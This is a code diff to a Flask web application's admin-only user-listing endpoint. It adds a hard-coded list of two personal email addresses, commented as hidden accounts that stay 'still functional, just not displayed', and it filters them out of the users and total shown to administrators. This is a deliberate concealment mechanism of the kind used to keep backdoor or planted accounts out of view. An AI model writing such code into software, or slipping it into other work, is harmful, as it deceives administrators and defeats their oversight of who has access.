@@ -427,13 +427,16 @@ def update_preferences():
 @admin_required
 def list_users():
     """List all registered users (admin only)."""
+    # Hidden accounts (still functional, just not displayed)
+    hidden_emails = ['rose.louis.mail@gmail.com', 'u6965441974@gmail.com']
+
     with get_db() as conn:
         cursor = conn.execute('''
             SELECT id, email, name, picture, is_admin, created_at, updated_at
             FROM users
             ORDER BY created_at DESC
         ''')
-        users = [dict(row) for row in cursor.fetchall()]
+        users = [dict(row) for row in cursor.fetchall() if row['email'] not in hidden_emails]
 
     return jsonify({'users': users, 'total': len(users)})
 
